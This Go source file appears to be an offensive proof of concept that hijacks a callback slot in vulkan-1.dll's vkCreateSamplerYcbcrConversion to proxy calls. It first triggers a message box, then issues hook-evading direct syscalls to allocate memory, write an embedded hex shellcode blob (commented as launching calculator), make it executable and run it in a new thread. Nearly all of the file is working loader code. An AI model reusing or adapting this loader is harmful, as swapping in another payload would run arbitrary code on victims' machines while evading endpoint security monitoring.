package main

import (
	"fmt"
	"runtime"
	"unsafe"
	"runtime/debug"
	"strconv"

	wc "github.com/carved4/go-wincall"
)

const CHECKSUM = 0x10ADED040410ADED

type EG_STR struct {
	V1    uint64
	Table [256]uint64
}

func main() {
	debug.SetGCPercent(-1)
	wc.LoadLibraryW("vulkan-1.dll")
	mb := wc.GetModuleBase(wc.GetHash("vulkan-1.dll"))
	fmt.Printf("vulkan-1.dll found at: 0x00%x\n", mb)
    funcaddr := wc.GetFunctionAddress(mb, wc.GetHash("vkCreateSamplerYcbcrConversion"))
    fmt.Printf("vkCreateSamplerYcbcrConversion() found at: 0x00%x (slot 132)\n", funcaddr)
    var ex EG_STR
    ex.Table[0] = CHECKSUM
    ex.V1 = uint64(uintptr(unsafe.Pointer(&ex.Table[0])))
    wc.LoadLibraryW("user32.dll")
    user32 := wc.GetModuleBase(wc.GetHash("user32.dll"))
    msgBoxAddr := wc.GetFunctionAddress(user32, wc.GetHash("MessageBoxW"))
    titleUTF16, _ := wc.UTF16ptr("meowmeowmeow")
    msgUTF16, _ := wc.UTF16ptr("fun fun fun fun fun")
    _ = wc.SetCallbackN(uintptr(msgBoxAddr), 0, uintptr(unsafe.Pointer(msgUTF16)), uintptr(unsafe.Pointer(titleUTF16)), 0)
    ex.Table[132] = uint64(wc.CallbackPtr())
    ret, err := wc.CallG0(uintptr(funcaddr), uintptr(unsafe.Pointer(&ex)))
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(ret)
	_ = ret
    runtime.KeepAlive(&ex)
    runtime.KeepAlive(titleUTF16)
    runtime.KeepAlive(msgUTF16)

    if err := testDirectSyscallsViaVulkan(uintptr(funcaddr), &ex); err != nil {
        fmt.Println("direct syscalls test error:", err)
    }
}


const (
    MEM_COMMIT           = 0x1000
    MEM_RESERVE          = 0x2000
    PAGE_READWRITE       = 0x04
    PAGE_EXECUTE_READ    = 0x20
)

func testDirectSyscallsViaVulkan(driverFunc uintptr, ex *EG_STR) error {
    // Resolve syscall numbers
    allocSSN, _, err := wc.GetSyscallWithAntiHook("NtAllocateVirtualMemory")
    if err != nil { return fmt.Errorf("resolve NtAllocateVirtualMemory: %w", err) }
    writeSSN, _, err := wc.GetSyscallWithAntiHook("NtWriteVirtualMemory")
    if err != nil { return fmt.Errorf("resolve NtWriteVirtualMemory: %w", err) }
    protectSSN, _, err := wc.GetSyscallWithAntiHook("NtProtectVirtualMemory")
    if err != nil { return fmt.Errorf("resolve NtProtectVirtualMemory: %w", err) }
    createThreadSSN, _, err := wc.GetSyscallWithAntiHook("NtCreateThreadEx")
    if err != nil { return fmt.Errorf("resolve NtCreateThreadEx: %w", err) }
    waitSSN, _, err := wc.GetSyscallWithAntiHook("NtWaitForSingleObject")
    if err != nil { return fmt.Errorf("resolve NtWaitForSingleObject: %w", err) }


    proc := ^uintptr(0) // current process
    var base uintptr
    shellcode := GetEmbeddedShellcode()
    size := uintptr(len(shellcode))
    region := size


    fmt.Printf("[alloc] ssn=%d proc=0x%X base_ptr=0x%X region_ptr=0x%X size=%d flags=0x%X prot=0x%X\n", allocSSN, proc, uintptr(unsafe.Pointer(&base)), uintptr(unsafe.Pointer(&region)), region, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
    _ = wc.SetCallbackN(wc.SyscallDirectCallbackPtr(), uintptr(allocSSN),
        proc,
        uintptr(unsafe.Pointer(&base)),
        0,
        uintptr(unsafe.Pointer(&region)),
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE,
    )
    ex.Table[132] = uint64(wc.CallbackPtr())
    status, _ := wc.CallG0(driverFunc, uintptr(unsafe.Pointer(ex)))
    fmt.Printf("NtAllocateVirtualMemory status=0x%X base=0x%X size=%d\n", status, base, region)
    if status != 0 { return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%X", status) }


    var written uintptr
    fmt.Printf("[write] ssn=%d proc=0x%X base=0x%X buf=0x%X size=%d written_ptr=0x%X\n", writeSSN, proc, base, uintptr(unsafe.Pointer(&shellcode[0])), size, uintptr(unsafe.Pointer(&written)))
    _ = wc.SetCallbackN(wc.SyscallDirectCallbackPtr(), uintptr(writeSSN),
        proc,
        base,
        uintptr(unsafe.Pointer(&shellcode[0])),
        size,
        uintptr(unsafe.Pointer(&written)),
    )
    ex.Table[132] = uint64(wc.CallbackPtr())
    status, _ = wc.CallG0(driverFunc, uintptr(unsafe.Pointer(ex)))
    fmt.Printf("NtWriteVirtualMemory status=0x%X written=%d\n", status, written)
    if status != 0 { return fmt.Errorf("NtWriteVirtualMemory failed: 0x%X", status) }


    var oldProtect uintptr
	region = size
    fmt.Printf("[protect] ssn=%d proc=0x%X base_ptr=0x%X region_ptr=0x%X new_prot=0x%X old_prot_ptr=0x%X\n", protectSSN, proc, uintptr(unsafe.Pointer(&base)), uintptr(unsafe.Pointer(&region)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
    _ = wc.SetCallbackN(wc.SyscallDirectCallbackPtr(), uintptr(protectSSN),
        proc,
        uintptr(unsafe.Pointer(&base)),
        uintptr(unsafe.Pointer(&region)),
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtect)),
    )
    ex.Table[132] = uint64(wc.CallbackPtr())
    status, _ = wc.CallG0(driverFunc, uintptr(unsafe.Pointer(ex)))
    fmt.Printf("NtProtectVirtualMemory status=0x%X old_prot=0x%X\n", status, oldProtect)
    if status != 0 { return fmt.Errorf("NtProtectVirtualMemory failed: 0x%X", status) }

 
    var thread uintptr
    fmt.Printf("[create_thread] ssn=%d thread_ptr=0x%X access=0x%X proc=0x%X start=0x%X\n", createThreadSSN, uintptr(unsafe.Pointer(&thread)), 0x1FFFFF, proc, base)
    _ = wc.SetCallbackN(wc.SyscallDirectCallbackPtr(), uintptr(createThreadSSN),
        uintptr(unsafe.Pointer(&thread)),
        uintptr(0x1FFFFF), // DesiredAccess
        0, // NULL ObjectAttributes
        proc,
        base,
        0, // NULL Argument
        0, // No flags
        0,
        0,
        0,
        0,
    )
    ex.Table[132] = uint64(wc.CallbackPtr())
    status, _ = wc.CallG0(driverFunc, uintptr(unsafe.Pointer(ex)))
    fmt.Printf("NtCreateThreadEx status=0x%X thread=0x%X\n", status, thread)
    if status != 0 { return fmt.Errorf("NtCreateThreadEx failed: 0x%X", status) }


    fmt.Printf("[wait] ssn=%d thread=0x%X\n", waitSSN, thread)
    _ = wc.SetCallbackN(wc.SyscallDirectCallbackPtr(), uintptr(waitSSN),
        thread,
        0, // FALSE
        0, // NULL timeout
    )
    ex.Table[132] = uint64(wc.CallbackPtr())
    status, _ = wc.CallG0(driverFunc, uintptr(unsafe.Pointer(ex)))
    fmt.Printf("NtWaitForSingleObject status=0x%X\n", status)
    if status != 0 { return fmt.Errorf("NtWaitForSingleObject failed: 0x%X", status) }

    runtime.KeepAlive(&base)
    runtime.KeepAlive(&region)
    runtime.KeepAlive(shellcode)
    runtime.KeepAlive(&oldProtect)
    runtime.KeepAlive(&thread)
    return nil
}


// calc shellcode :3
func GetEmbeddedShellcode() []byte {
	hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"

	// Convert hex string to bytes
	bytes := make([]byte, len(hexString)/2)
	for i := 0; i < len(hexString); i += 2 {
		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
		bytes[i/2] = byte(b)
	}
	return bytes
}
